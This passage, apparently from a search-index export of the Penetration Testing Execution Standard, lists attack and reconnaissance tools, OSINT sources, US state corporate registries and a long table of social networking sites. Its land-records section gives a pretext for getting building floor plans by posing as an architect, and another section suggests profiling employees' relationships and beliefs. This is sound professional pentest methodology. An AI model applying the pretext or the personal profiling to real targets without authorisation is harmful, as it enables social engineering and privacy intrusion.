Linux distribution built for the specific purpose of web application scanning. Includes tools such as Fierce, Maltego, WebScarab, BeEF any many more tools specific to web application testing. | |- |SiteDigger | http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx |SiteDigger 3.0 is a free tool that runs on Windows. It searches Google\u2019s cache to look for vulnerabilities, errors, configuration issues, proprietary information, and interesting security nuggets on web sites. |'''*''' |- |FOCA | http://www.informatica64.com/DownloadFOCA |FOCA is a tool that allows you to find out more about a website by (amongst other things) analysing the metadata in any documents it makes available. |'''*''' |- |THC IPv6 Attack Toolkit | http://www.thc.org/thc-ipv6 |The largest single collection of tools designed to exploit vulnerabilities in the IPv6 and ICMP6 protocols. | |- |THC Hydra | http://thc.org/thc-hydra/ |Hydra is a very fast network logon brute force cracker which can attack many different services and file_suport. |'''*''' |- |Cain | http://www.oxid.it/cain.html |Cain & Abel is a password recovery tool that runs on Windows. It allows easy recovery of various kind of passwords by sniffing the network, cracking encrypted passwords using Dictionary, Brute-Force and Cryptanalysis attacks, recording VoIP conversations, decoding scrambled passwords, recovering wireless network keys, revealing password boxes, uncovering cached passwords and analyzing routing protocols. |'''*''' |- |cree.py | http://ilektrojohn.github.com/creepy/ |cree.py gathers geolocation related information from social networking platforms and image hosting services. Then the information is presented in a map where all the retrieved data is shown accompanied with relevant information (i.e. what was posted from that specific location) to provide context. | |- |inSSIDer | http://www.metageek.net/products/inssider |inSSIDer is a free gui-based wifi discovery and troubleshooting tool for Windows |'''*''' |- |Kismet Newcore | http://www.kismetwireless.net |Kismet is an 802.11 layer2 wireless network detector, sniffer, and intrusion detection system. Kismet passively collects packets from both named and hidden networks with any wireless adapter that supports raw monitor mode. | |- |Rainbow Crack | http://project-rainbowcrack.com |Rainbow Crack is a password cracker that will run a pre-computed rainbow table against a given series of hashes. | |- |dnsenum | http://code.google.com/p/dnsenum |Think of dnsenum as a supercharged version of a whois query. It not only discovers all of the dns records but it goes a step further and attempts to use google to discover subdomains, discovers BIND versions and more. | |- |dnsmap | http://code.google.com/p/dnsmap |Dnsmap is a passive dns mapper that is used for subdomain bruteforce discovery. | |- |dnsrecon | http://www.darkoperator.com/tools-and-scripts/ |DNS enumeration script written in ruby for performing TLD expansion, SRV record enumeration, host and subdomain brute force, zone transfer, reverse lookup and general record identification. | |- |dnstracer | http://www.mavetju.org/unix/dnstracer.php |dnstracer determines where a given Domain Name Server (DNS) gets its information from and follows the chain of DNS servers back to the servers which know the data. | |- |dnswalk | http://sourceforge.net/projects/dnswalk |Dnswalk is a DNS debugger. It performs zone transfers of specified domains, and checks the database in numerous ways for internal consistency, as well as accuracy. | |- |Fierce | http://ha.ckers.org/fierce |Fierce domain scan discovers non-contiguous IP ranges of a network. | |- |Fierce2 | http://trac.assembla.com/fierce/ |Fierce 2 is an updated version that is maintained by a new group of developers. | |- |FindDomains | http://code.google.com/p/finddomains |FindDomains is a multithreaded search engine discovery tool that will be very useful for penetration testers dealing with discovering domain names/web sites/virtual hosts which are located on too many IP addresses. Provides a console interface so you can easily integrate this tool to your pentesting automation system. |'''*''' |- |HostMap | http://hostmap.lonerunners.net |hostmap is a free and automatic tool that enables the discovery of all hostnames and virtual hosts on a given IP address. | |- |URLcrazy | http://www.morningstarsecurity.com/research/urlcrazy |URLCrazy is a domainname typo generator. This will allow you to find squatted domains related to your target company and possibly generate some of your own. | |- |theHarvester | http://www.edge-security.com/theHarvester.php |theHarvester is a tool for gathering e-mail accounts, user names and hostnames/subdomains from different public sources like search engines and PGP key servers. | |- |The Metasploit Framework | http://metasploit.com |Metasploit is an ever-growing collection of remote exploits and post exploitation tools for all platforms. You will want to constantly run svn updates on this tool since new features and exploits are added nearly daily. Metasploit is both incredibly powerful and complex. For further guidance, check out this book http://nostarch.com/metasploit.htm . | |- |The Social-Engineer Toolkit (SET) | http://www.secmaniac.com/download/ |The Social-Engineer Toolkit (SET) is specifically designed to perform advanced attacks against the human element. Amongst other things, SET allows you to craft malcious emails and dummy websites based on legitimate ones to compliment a social engineering attack. | |- |Fast-Track | http://www.secmaniac.com/download/ |Fast-Track is an automated pentesting tool suite. Many of the issues Fast-Track exploits are due to improper sanitizing of client-side data within web applications, patch management, or lack of hardening techniques. It runs on Linux and depends on Metasploit 3. | |}","title":"Software"},{"location":"pentest_standard/tecguidelines/#intelligence-gathering","text":"Intelligence Gathering is the phase where data or \"intelligence\" is gathered to assist in guiding the assessment actions. At the broadest level this intelligence gathering includes information about employees, facilities, products and plans. Within a larger picture this intelligence will include potentially secret or private \"intelligence\" of a competitor, or information that is otherwise relevant to the target.","title":"Intelligence Gathering"},{"location":"pentest_standard/tecguidelines/#osint","text":"Open Source Intelligence (OSINT) in the simplest of terms is locating, and analyzing publically (open) available sources of information. The key component here is that this intelligence gathering process has a goal of producing current and relevant information that is valuable to either an attacker or competitor. For the most part, OSINT is more than simply performing web searches using various sources.","title":"OSINT"},{"location":"pentest_standard/tecguidelines/#corporate","text":"Information on a particular target should include information regarding the legal entity. Most states within the US require Corporations, limited liability companies and limited partnerships to file with the State division. This division serves as custodian of the filings and maintains copies and/or certifications of the documents and filings. This information may contain information regarding shareholders, members, officers or other persons involved in the target entity. {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''State''' | '''URL''' |- |Alabama |[ http://sos.alabama.gov/BusinessServices/NameRegistration.aspx http://sos.alabama.gov/BusinessServices/NameRegistration.aspx ] |- |Alaska |[ http://www.dced.state.ak.us/bsc/corps.htm http://www.dced.state.ak.us/bsc/corps.htm ] |- |Arizona |[ http://starpas.azcc.gov/scripts/cgiip.exe/WService#wsbroker1/main.p http://starpas.azcc.gov/scripts/cgiip.exe/WService#wsbroker1/main.p ] |- |Arkansas |[ http://www.sosweb.state.ar.us/corps/incorp http://www.sosweb.state.ar.us/corps/incorp ] |- |California |[ http://kepler.sos.ca.gov/ http://kepler.sos.ca.gov/ ] |- |Colorado |[ http://www.state.co.us/ http://www.state.co.us ] |- |Connecticut |[ http://www.state.ct.us/ http://www.state.ct.us ] |- |Delaware |[ http://www.state.de.us/ http://www.state.de.us ] |- |District of Columbia |[ http://www.ci.washington.dc.us/ http://www.ci.washington.dc.us ] |- |Florida |[ http://www.sunbiz.org/search.html http://www.sunbiz.org/search.html ] |- |Georgia |[ http://corp.sos.state.ga.us/corp/soskb/CSearch.asp http://corp.sos.state.ga.us/corp/soskb/CSearch.asp ] |- |Hawaii |[ http://www.state.hi.us/ http://www.state.hi.us ] |- |Idaho |[ http://www.accessidaho.org/public/sos/corp/search.html?SearchFormstep#crit http://www.accessidaho.org/public/sos/corp/search.html?SearchFormstep#crit ] |- |Illinois |[ http://www.ilsos.gov/corporatellc http://www.ilsos.gov/corporatellc ] |- |Indiana |[ http://secure.in.gov/sos/bus_service/online_corps/default.asp http://secure.in.gov/sos/bus_service/online_corps/default.asp ] |- |Iowa |[ http://www.state.ia.us/ http://www.state.ia.us ] |- |Kansas |[ http://www.accesskansas.org/apps/corporations.html http://www.accesskansas.org/apps/corporations.html ] |- |Kentucky |[ http://ukcc.uky.edu/~vitalrec http://ukcc.uky.edu/ ~ vitalrec] |- |Louisiana |[ http://www.sec.state.la.us/crpinq.htm http://www.sec.state.la.us/crpinq.htm ] |- |Maine |[ http://www.state.me.us/sos/cec/corp/ucc.htm http://www.state.me.us/sos/cec/corp/ucc.htm ] |- |Maryland |[ http://sdatcert3.resiusa.org/ucc-charter http://sdatcert3.resiusa.org/ucc-charter ] |- |Massachusetts |[ http://ucc.sec.state.ma.us/psearch/default.asp http://ucc.sec.state.ma.us/psearch/default.asp ] |- |Michigan |[ http://www.cis.state.mi.us/bcs_corp/sr_corp.asp http://www.cis.state.mi.us/bcs_corp/sr_corp.asp ] |- |Minnesota |[ http://www.state.mn.us/ http://www.state.mn.us/ ] |- |Mississippi |[ http://www.sos.state.ms.us/busserv/corpsnap http://www.sos.state.ms.us/busserv/corpsnap ] |- |Missouri |[ http://www.state.mo.us/ http://www.state.mo.us ] |- |Montana |[ http://sos.state.mt.us/ http://sos.state.mt.us ] |- |Nebraska |[ http://www.sos.state.ne.us/htm/UCCmenu.htm http://www.sos.state.ne.us/htm/UCCmenu.htm ] |- |Nevada |[ http://sandgate.co.clark.nv.us:8498/cicsRecorder/ornu.htm http://sandgate.co.clark.nv.us:8498/cicsRecorder/ornu.htm ] |- |New Hampshire |[ http://www.state.nh.us/ http://www.state.nh.us ] |- |New Jersey |[ http://www.state.nj.us/treasury/revenue/searchucc.htm http://www.state.nj.us/treasury/revenue/searchucc.htm ] |- |New Mexico |[ http://www.sos.state.nm.us/UCC/UCCSRCH.HTM http://www.sos.state.nm.us/UCC/UCCSRCH.HTM ] |- |New York |[ http://wdb.dos.state.ny.us/corp_public/corp_wdb.corp_search_inputs.show http://wdb.dos.state.ny.us/corp_public/corp_wdb.corp_search_inputs.show ] |- |North Carolina |[ http://www.secstate.state.nc.us/research.htm http://www.secstate.state.nc.us/research.htm ] |- |North Dakota |[ http://www.state.nd.us/sec http://www.state.nd.us/sec ] |- |Ohio |[ http://serform.sos.state.oh.us/pls/report/report.home http://serform.sos.state.oh.us/pls/report/report.home ] |- |Oklahoma |[ http://www.oklahomacounty.org/coclerk/ucc/default.asp http://www.oklahomacounty.org/coclerk/ucc/default.asp ] |- |Oregon |[ http://egov.sos.state.or.us/br/pkg_web_name_srch_inq.login http://egov.sos.state.or.us/br/pkg_web_name_srch_inq.login ] |- |Pennsylvania |[ http://www.dos.state.pa.us/DOS/site/default.asp http://www.dos.state.pa.us/DOS/site/default.asp ] |- |Rhode Island |[ http://155.212.254.78/ http://155.212.254.78 ] |- |South Carolina |[ http://www.scsos.com/corp_search.htm http://www.scsos.com/corp_search.htm ] |- |South Dakota |[ http://www.state.sd.us/ http://www.state.sd.us ] |- |Tennessee |[ http://www.state.tn.us/sos/service.htm http://www.state.tn.us/sos/service.htm ] |- |Texas |[ https://ourcpa.cpa.state.tx.us/coa/Index.html https://ourcpa.cpa.state.tx.us/coa/Index.html ] |- |Utah |[ http://www.commerce.state.ut.us/ http://www.commerce.state.ut.us ] |- |Vermont |[ http://www.sec.state.vt.us/seek/database.htm http://www.sec.state.vt.us/seek/database.htm ] |- |Virginia |[ http://www.state.va.us/ http://www.state.va.us ] |- |Washington |[ http://www.dol.wa.gov/business/UCC/ http://www.dol.wa.gov/business/UCC/ ] |- |West Virginia |[ http://www.wvsos.com/wvcorporations http://www.wvsos.com/wvcorporations ] |- |Wisconsin |[ http://www.wdfi.org/corporations/crispix http://www.wdfi.org/corporations/crispix ] |- |Wyoming |[ http://soswy.state.wy.us/Corp_Search_Main.asp http://soswy.state.wy.us/Corp_Search_Main.asp ] |}","title":"Corporate"},{"location":"pentest_standard/tecguidelines/#physical","text":"Often the first step in OSINT is to identify the physical locations of the target corporation. This information might be readily available for publically known or published locations, but not quite so easy for more secretive sites. Public sites can often be location by using search engines such as: Google -[ http://www.google.com/ http://www.google.com ] Yahoo - [ http://yahoo.com/ http://yahoo.com ] Bing - [ http://www.bing.com/ http://www.bing.com ] Ask.com - [ http://ask.com/ http://ask.com ]","title":"Physical"},{"location":"pentest_standard/tecguidelines/#locations","text":"","title":"Locations"},{"location":"pentest_standard/tecguidelines/#sharedindividual","text":"As part of identifying the physical location it is important to note if the location is an individual building or simply a suite in a larger facility. It is important to attempt to identify neighboring businesses as well as common areas.","title":"Shared/Individual"},{"location":"pentest_standard/tecguidelines/#owner","text":"Once the physical locations have been identified, it is useful to identify the actual property owner(s). This can either be an individual, group, or corporation. If the target corporation does not own the property then they may be limited in what they can physically do to enhance or improve the physical location.","title":"Owner"},{"location":"pentest_standard/tecguidelines/#landtax-records","text":"Tax records: http://www.naco.org/Counties/Pages/CitySearch.aspx Land and tax records generally include a wealth of information on a target such as ownership, possession, mortgage companies, foreclosure notices, photographs and more. The information recorded and level of transparency varies greatly by jurisdiction. Land and tax records within the United States are typically handled at the county level. To start, if you know the city or zipcode in which your target resides, use a site such as http://publicrecords.netronline.com/ to determine which county that is in. Then switching over to Google you can use a query such as \"XXXX county tax records\", \"XXXX county recording office\" or \"XXXX county assessor\" and that should lead you to a searchable online database if one exists. If it does not exist, you can still call the county recording office and request that they fax you specific records if you have an idea of what you are looking for. Building department: For some assessments, it might make sense to go a step further and query the local building department for additional information. Depending on the city, the target's site might be under county or city jurisdiction. Typically that can be determined by a call to either entity. The building department generally has floor plans, old & current permits, tenant improvement information and other similar information on file. Buried in that information might be names of contracting firms, engineers, architects and more. All of which could be used with a tool such as SET. In most cases, a phone call will be required to obtain any of this information but most building departments are happy to hand it out to anyone who asks. Here is a possible pretext you could use to obtain floor plans: You could call up and say that you are an architectural consultant who has been hired to design a remodel or addition to the building and it would help the process go much smoother if you could get a copy of the original plans.","title":"Land/tax records"},{"location":"pentest_standard/tecguidelines/#datacenter-locations","text":"Identifying any target business data center locations via either the corporate website, public filings, land records or via a search engine can provide additional potential targets.","title":"Datacenter Locations"},{"location":"pentest_standard/tecguidelines/#time-zones","text":"Identifying the time zones that the target operates in provides valuable information regarding the hours of operation. It is also significant to understand the relationship between the target time zone and that of the assessment team. A time zone map is often useful as a reference when conducting any test. [[:File:Penetration_Testing_Execution_02.png|TimeZone Map]]","title":"Time zones"},{"location":"pentest_standard/tecguidelines/#offsite-gathering","text":"Identifying any recent or future offsite gatherings or parties via either the corporate website or via a search engine can provide valuable insight into the corporate culture of a target. It is often common practice for businesses to have offsite gatherings not only for employees, but also for business partners and customers. Collecting this data could provide insight into potential items of interest to an attacker.","title":"Offsite gathering"},{"location":"pentest_standard/tecguidelines/#productservices","text":"Identifying the target business products and any significant data related to such launches via the corporate website, new releases or via a search engine can provide valuable insight into the internal workings of a target. It is often common practice for businesses to make such notifications publicly in an effort to garner publicity and to inform current and/or new customers of the launch. Publicly available information includes, but is not limited to, foreign language documents, radio and television broadcasts, Internet sites, and public speaking.","title":"Product/Services"},{"location":"pentest_standard/tecguidelines/#company-dates","text":"Significant company dates can provide insight into potential days where staff may be on alert higher than normal. This could be due to potential corporate meetings, board meetings, investor meetings, or corporate anniversary. Normally, businesses that observe various holidays have a significantly reduced staff and therefore targeting may prove to be much more difficult during these periods.","title":"Company Dates"},{"location":"pentest_standard/tecguidelines/#position-identification","text":"Within every target it is critical that you identify and document the top positions within the organization. This is critical to ensure that the resulting report is targeting the correct audience. At a minimum, key employees should be identified as part of any engagement.","title":"Position identification"},{"location":"pentest_standard/tecguidelines/#organizational-chart","text":"Understanding the organizational structure is important, not only to understand the depth of the structure, but also the breadth. If the organization is extremely large, it is possible that new staff or personnel could go undetected. In smaller organizations, the likelihood is not as great. Getting a good picture of this structure can also provide insight into the functional groups. This information can be useful in determining internal targets.","title":"Organizational Chart"},{"location":"pentest_standard/tecguidelines/#corporate-communications","text":"Identifying corporate communications either via the corporate website or a job search engine can provide valuable insight into the internal workings of a target.","title":"Corporate Communications"},{"location":"pentest_standard/tecguidelines/#marketing","text":"Marketing communications are often used to make corporate announcements regarding currently, or future product releases, and partnerships.","title":"Marketing"},{"location":"pentest_standard/tecguidelines/#lawsuits","text":"Communications regarding the targets involvement in litigation can provide insight into potential threat agent or data of interest.","title":"Lawsuits"},{"location":"pentest_standard/tecguidelines/#transactions","text":"Communications involving corporate transactions may be indirect response to a marketing announcement or lawsuit.","title":"Transactions"},{"location":"pentest_standard/tecguidelines/#job-openings","text":"Searching current job openings or postings via either the corporate website or via a job search engine can provide valuable insight into the internal workings of a target. It is often common practice to include information regarding currently, or future, technology implementations. Collecting this data could provide insight into potential items of interest to an attacker. Several Job Search Engines exist that can be queried for information regarding the target. {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Site''' | '''URL''' |- |Monster |[ http://www.monster.com/ http://www.monster.com ] |- |CareerBuilder |[ http://www.careerbuilder.com/ http://www.careerbuilder.com ] |- |Computerjobs.com |[ http://www.computerjobs.com/ http://www.computerjobs.com ] |- |Craigslist |[ http://www.craigslist.org/about/sites/ http://www.craigslist.org/about/sites ] |}","title":"Job openings"},{"location":"pentest_standard/tecguidelines/#relationships","text":"Identifying the targets logical relationships is critical to understand more about how the business operates. Publicly available information should be leveraged to determine the target business relationship with vendors, business partners, law firms, etc. This is often available via news releases, corporate web sites (target and vendors), and potentially via industry related forums.","title":"Relationships"},{"location":"pentest_standard/tecguidelines/#charity-affiliations","text":"Identifying any target business charity affiliations via either the corporate website or via a search engine can provide valuable insight into the internal workings and potentially the corporate culture of a target. It is often common practice for businesses to make charitable donations to various organizations. Collecting this data could provide insight into potential items of interest to an attacker.","title":"Charity Affiliations"},{"location":"pentest_standard/tecguidelines/#network-providers","text":"Identifying any network provisioning or providers either via the allocated netblock /address information, corporate website or via a search engine can provide valuable insight into the potentially of a target. It is often common practice for businesses to make charitable donations to various organizations. Collecting this data could provide insight into potential items of interest to an attacker.","title":"Network Providers"},{"location":"pentest_standard/tecguidelines/#business-partners","text":"Identifying business partners is critical to gaining insight into not only the corporate culture of a target, but also potentially technologies being used. It is often common practice for businesses to announce partnership agreements. Collecting this data could provide insight into potential items of interest to an attacker.","title":"Business Partners"},{"location":"pentest_standard/tecguidelines/#competitors","text":"Identifying competitors can provide a window into potential adversaries. It is not uncommon for competitors to announce news that could impact the target. These could range from new hires, product launches, and even partnership agreements. Collecting this data is important to fully understand any potential corporate hostility.","title":"Competitors"},{"location":"pentest_standard/tecguidelines/#individuals","text":"","title":"Individuals"},{"location":"pentest_standard/tecguidelines/#social-networking-profile","text":"The numbers of active Social Networking websites as well as the number of users make this a prime location to identify employee's friendships, kinships, common interest, financial exchanges, likes/dislikes, sexual relationships, or beliefs. It is even possible to determine an employee's corporate knowledge or prestige.","title":"Social Networking Profile"},{"location":"pentest_standard/tecguidelines/#social-networking-websites","text":"{|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Name''' | '''URL''' | '''Description/Focus''' |- |Academia.edu |[ http://www.academia.edu/ http://www.academia.edu ] |Social networking site for academics/researchers |- |Advogato |[ http://www.advogato.org/ http://www.advogato.org ] |Free and open source software developers |- |aNobii |[ http://www.anobii.com/anobii_home http://www.anobii.com/anobii_home ] |Books |- |aSmallWorld |[ http://www.asmallworld.net/ http://www.asmallworld.net ] |European jet set and social elite world-wide |- |AsianAvenue |[ http://www.asianave.com/ http://www.asianave.com ] |A social network for the Asian American community |- |Athlinks |[ http://www.athlinks.com/ http://www.athlinks.com ] |Open Running, Swimming |- |Audimated.com |[ http://www.audimated.com/ http://www.audimated.com ] |Independent Music |- |Avatars United |[ http://www.avatarsunited.com/ http://www.avatarsunited.com ] |Online games |- |Badoo |[ http://badoo.com/ http://badoo.com ] |General, Meet new people, Popular in Europe and LatAm |- |Bebo |[ http://www.bebo.com/ http://www.bebo.com ] |General |- |Bigadda |[ http://bigb.bigadda.com/ http://bigb.bigadda.com ] |Indian Social Networking Site |- |Federated Media's BigTent |[ http://www.federatedmedia.net/ http://www.federatedmedia.net ] |Organization and communication portal for groups |- |Biip.no |[ http://www.biip.no/ http://www.biip.no ] |Norwegian community |- |BlackPlanet |[ http://www.blackplanet.com/ http://www.blackplanet.com ] |African-Americans |- |Blauk |[ http://blauk.com/ http://blauk.com ] |Anyone who wants to tell something about a stranger or acquaintance. |- |Blogster |[ http://www.blogster.com/ http://www.blogster.com ] |Blogging community |- |Bolt.com |[ http://www.bolt.com/ http://www.bolt.com ] |General |- |Buzznet |[ http://www.buzznet.com/ http://www.buzznet.com ] |Music and pop-culture |- |CafeMom |[ http://www.cafemom.com/ http://www.cafemom.com ] |Mothers |- |Cake Financial |[ http://www.cakefinancial.com/ http://www.cakefinancial.com ] |Investing |- |Care2 |[ http://www.care2.com/ http://www.care2.com ] |Green living and social activism |- |CaringBridge |[ http://www.caringbridge.org/ http://www.caringbridge.org ] |Not for profit providing free websites that connect family and friends during a serious health event, care and recovery. |- |Cellufun |[ http://m.cellufun.com/ http://m.cellufun.com ] |Mobile social game network, Number 8 US mobile website |- |Classmates.com |[ http://www.classmates.com/ http://www.classmates.com ] |School, college, work and the military |- |Cloob |[ http://www.cloob.com/ http://www.cloob.com ] |General. Popular in Iran |- |CouchSurfing |[ http://www.couchsurfing.org/ http://www.couchsurfing.org ] |Worldwide network for making connections between travelers and the local communities they visit. |- |CozyCot |[ http://www.cozycot.com/ http://www.cozycot.com ] |East Asian and Southeast Asian women |- |Cross.tv |[ http://www.cross.tv/ http://www.cross.tv ] |Faith Based social network for Christian believers from around the world |- |Crunchyroll |[ http://www.crunchyroll.com/ http://www.crunchyroll.com ] |Anime and forums. |- |Cyworld |(Korea) [ http://cyworld.co.kr/ http://cyworld.co.kr ] (China) [ http://www.cyworld.com.cn/ http://www.cyworld.com.cn ] |General. Popular in South Korea. |- |DailyBooth |[ http://dailybooth.com/ http://dailybooth.com ] |Photo-blogging site where users upload a photo every day |- |DailyStrength |[ http://www.dailystrength.org/ http://www.dailystrength.org ] |Medical & emotional support community - Physical health, Mental health, Support groups |- |Decayenne |[ http://www.decayenne.com/ http://www.decayenne.com ] |European and American social elite |- |delicious |[ http://www.delicious.com/ http://www.delicious.com ] |Social bookmarking allowing users to locate and save websites that match their own interests |- |deviantART |[ http://www.deviantart.com/ http://www.deviantart.com ] |Art community |- |Disaboom |[ http://www.disaboom.com/ http://www.disaboom.com ] |People with disabilities (Amputee, cerebral palsy, MS, and other disabilities) |- |Dol2day |[ http://www.dol2day.de/ http://www.dol2day.de ] |Politic community, Social network, Internet radio (German-speaking countries) |- |DontStayIn |[ http://www.dontstayin.com/ http://www.dontstayin.com ] |Clubbing (primarily UK) |- |Draugiem.lv |[ http://www.draugiem.lv/ http://www.draugiem.lv ] |General (primarily LV, LT, HU) |- |douban |[ http://www.douban.com/ http://www.douban.com ] |Chinese Web 2.0 website providing user review and recommendation services for movies, books, and music. It is also the largest online Chinese language book, movie and music database and one of the largest online communities in China. |- |Elftown |[ http://www.elftown.com/ http://www.elftown.com ] |Community and wiki around Fantasy and sci-fi. |- |Entitycube |[ http://entitycube.research.microsoft.com/ http://entitycube.research.microsoft.com ] | |- |Eons.com |[ http://www.eons.com/ http://www.eons.com ] |For baby boomers |- |Epernicus |[ http://www.epernicus.com/ http://www.epernicus.com ] |For research scientists |- |Experience Project |[ http://www.experienceproject.com/ http://www.experienceproject.com ] |Life experiences |- |Exploroo |[ http://www.exploroo.com/ http://www.exploroo.com ] |Travel Social Networking. |- |Facebook |(IPv4) [ http://www.facebook.com/ http://www.facebook.com ] (IPv6) [ http://www.v6.facebook.com/ http://www.v6.facebook.com ] |General. |- |Faceparty |[ http://www.faceparty.com/ http://www.faceparty.com ] |General. Popular UK. |- |Faces.com |[ http://www.face-pic.com/ http://www.face-pic.com ] [ http://www.faces.com/ http://www.faces.com ] |British teens |- |Fetlife |[ http://fetlife.com/ http://fetlife.com ] |People who are into BDSM |- |FilmAffinity |[ http://www.filmaffinity.com/ http://www.filmaffinity.com ] |Movies and TV Series |- |FitFinder |[ http://www.thefitfinder.co.uk/ http://www.thefitfinder.co.uk ] |Anonymous UK Student Microblogging Website |- |FledgeWing |[ http://www.fledgewing.com/ http://www.fledgewing.com ] |Entrepreneural community targeted towards worldwide university students |- |Flixster |[ http://www.flixster.com/ http://www.flixster.com ] |Movies |- |Flickr |[ http://www.flickr.com/ http://www.flickr.com ] |Photo sharing, commenting, photography related networking, worldwide |- |Focus.com |[ http://www.focus.com/ http://www.focus.com ] |Business to Business, worldwide |- |Folkdirect |[ http://www.folkdirect.com/ http://www.folkdirect.com ] |General |- |Fotki |[ http://www.fotki.com/ http://www.fotki.com ] |Photo sharing, video hosting, photo contests, journals, forums, flexible privacy protection, friend's feed, audio comments and unlimited custom design integration. |- |Fotolog |[ http://www.fotolog.com/ http://www.fotolog.com ] |Photoblogging. Popular in South America and Spain |- |Foursquare |[ http://foursquare.com/ http://foursquare.com ] |Location based mobile social network |- |Friends Reunited |[ http://www.friendsreunited.com/ http://www.friendsreunited.com ] |UK based. School, college, work, sport and streets |- |Friendster |[ http://www.friendster.com/ http://www.friendster.com ] |General. Popular in Southeast Asia. No longer popular in the western world |- |Fr\u00b8hst\u00b8ckstreff |[ http://www.fruehstueckstreff.de/ http://www.fruehstueckstreff.de ] |General |- |Fubar |[ http://www.fubar.com/ http://www.fubar.com ] |dating, an \"online bar\" for 18 and older |- |Gaia Online |[ http://www.gaiaonline.com/ http://www.gaiaonline.com ] |Anime and games. Popular in USA, Canada and Europe. Moderately popular around Asia. |- |GamerDNA |[ http://www.gamerdna.com/ http://www.gamerdna.com ] |Computer and video games |- |Gather.com |[ http://home.gather.com/ http://home.gather.com ] |Article, picture, and video sharing, as well as group discussions |- |Gays.com |[ http://gays.com/ http://gays.com ] |Social network for LGBT community, Guide for LGBT bars, restaurants, clubs, shopping |- |Geni.com |[ http://www.geni.com/ http://www.geni.com ] |Families, genealogy |- |Gogoyoko |[ http://www.gogoyoko.com/ http://www.gogoyoko.com ] |Fair play in Music - Social networking site for musicians and music lovers |- |Goodreads |[ http://www.goodreads.com/ http://www.goodreads.com ] |Library cataloging, book lovers |- |Goodwizz |[ http://www.goodwizz.com/ http://www.goodwizz.com ] |Social network with matchmaking and personality games to find new contacts. Global, based in France. |- |Google Buzz |[ http://www.google.com/buzz http://www.google.com/buzz ] |General |- |Google+ |[ http://plus.google.com/ http://plus.google.com ] |General |- |GovLoop |[ http://www.govloop.com/ http://www.govloop.com ] |For people in and around government |- |Gowalla |[ http://gowalla.com/ http://gowalla.com ] | |- |Grono.net |[ http://grono.net/ http://grono.net ] |Poland |- |Habbo |[ http://www.habbo.com/ http://www.habbo.com ] |General for teens. Over 31 communities worldwide. Chat Room and user profiles. |- |hi5 |[ http://hi5.com/ http://hi5.com ] |General. Popular in India, Mongolia, Thailand, Romania, Jamaica, Central Africa, Portugal and Latin America. Not very popular in the USA. |- |Hospitality Club |[ http://www.hospitalityclub.org/ http://www.hospitalityclub.org ] |Hospitality |- |Hotlist |[ http://www.thehotlist.com/ http://www.thehotlist.com ] |Geo-Social Aggregator rooted in the concept of knowing where your friends are, were, and will be. |- |HR.com |[ http://www.hr.com/ http://www.hr.com ] |Social networking site for Human Resources professionals |- |Hub Culture |[ http://www.hubculture.com/ http://www.hubculture.com ] |Global influencers focused on worth creation |- |Hyves |[ http://www.hyves.nl/ http://www.hyves.nl ] |General, Most popular in the Netherlands. |- |Ibibo |[ http://www.ibibo.com/ http://www.ibibo.com ] |Talent based social networking site that allows to promote one's self and also discover new talent. Most popular in India. |- |Identi.ca |[ http://identi.ca/ http://identi.ca ] |Twitter-like service popular with hackers and software freedom advocates. |- |Indaba Music |[ http://www.indabamusic.com/ http://www.indabamusic.com ] |Online collaboration for musicians, remix contests, and networking. |- |IRC-Galleria |[ http://www.irc-galleria.net/ http://www.irc-galleria.net ] |Finland |- |italki.com |[ http://www.italki.com/ http://www.italki.com ] |Language learning social network. 100 + languages. |- |InterNations |[ http://www.internations.org/ http://www.internations.org ] |International community |- |Itsmy |[ http://mobile.itsmy.com/ http://mobile.itsmy.com ] |Mobile community worldwide, blogging, friends, personal TV-shows |- |iWiW |[ http://iwiw.hu/ http://iwiw.hu ] |Hungary |- |Jaiku |[ http://www.jaiku.com/ http://www.jaiku.com ] |General. Microblogging. Owned by Google |- |JammerDirect.com |[ http://www.jammerdirect.com/ http://www.jammerdirect.com ] |Network for unsigned artists |- |kaioo |[ http://www.kaioo.com/ http://www.kaioo.com ] |General, nonprofit |- |Kaixin001 |[ http://www.kaixin001.com/ http://www.kaixin001.com ] |General. In Simplified Chinese; caters for mainland China users |- |Kiwibox |[ http://www.kiwibox.com/ http://www.kiwibox.com ] |General. For the users, by the users, a social network that is more than a community. |- |Lafango |[ http://lafango.com/ http://lafango.com ] |Talent-Focused media sharing site |- |Last.fm |[ http://www.last.fm/ http://www.last.fm ] |Music |- |LibraryThing |[ http://www.librarything.com/ http://www.librarything.com/ ] (German) [ http://www.librarything.de/ http://www.librarything.de ] |Book lovers |- |Lifeknot |[ http://www.lifeknot.com/ http://www.lifeknot.com ] |Shared interests, hobbies |- |LinkedIn |[ http://www.linkedin.com/ http://www.linkedin.com ] |Business and professional networking |- |LinkExpats |[ http://www.linkexpats.com/ http://www.linkexpats.com ] |Social networking website for expatriates. 100 + countries. |- |Listography |[ http://listography.com/ http://listography.com ] |Lists. Autobiography |- |LiveJournal |[ http://www.livejournal.com/ http://www.livejournal.com ] |Blogging. Popular in Russia and among the Russian-speaking diaspora abroad. |- |Livemocha |[ http://www.livemocha.com/ http://www.livemocha.com ] |Online language learning - dynamic online courses in 35 languages - world's largest community of native language speakers. |- |LunarStorm |[ http://www.lunarstorm.se/ http://www.lunarstorm.se ] |Sweden |- |MEETin |[ http://www.meetin.org/ http://www.meetin.org ] |General |- |Meetup.com |[ http://www.meetup.com/ http://www.meetup.com ] |General. Used to plan offline meetings for people interested in various activities |- |Meettheboss |[ http://www.meettheboss.tv/ http://www.meettheboss.tv ] |Business and Finance community, worldwide. |- |Mixi |[ http://www.mixi.jp/ http://www.mixi.jp ] |Japan |- |mobikade |[ http://www.mkade.com/ http://www.mkade.com ] |mobile community, UK only |- |MocoSpace |[ http://www.mocospace.com/ http://www.mocospace.com ] |mobile community, worldwide |- |MOG |[ http://www.mog.com/ http://www.mog.com ] |Music |- |MouthShut.com |[ http://www.mouthshut.com/ http://www.mouthshut.com ] |Social Network, social media, consumer reviews |- |Mubi (website) |[ http://mubi.com/ http://mubi.com ] |Auteur cinema |- |Multiply |[ http://multiply.com/ http://multiply.com ] |Real world relationships. Popular in primarily in Asia. |- |Muxlim |[ http://muxlim.com/ http://muxlim.com ] |Muslim portal site |- |MyAnimeList |[ http://www.myanimelist.net/ http://www.myanimelist.net ] |Anime themed social community |- |MyChurch |[ 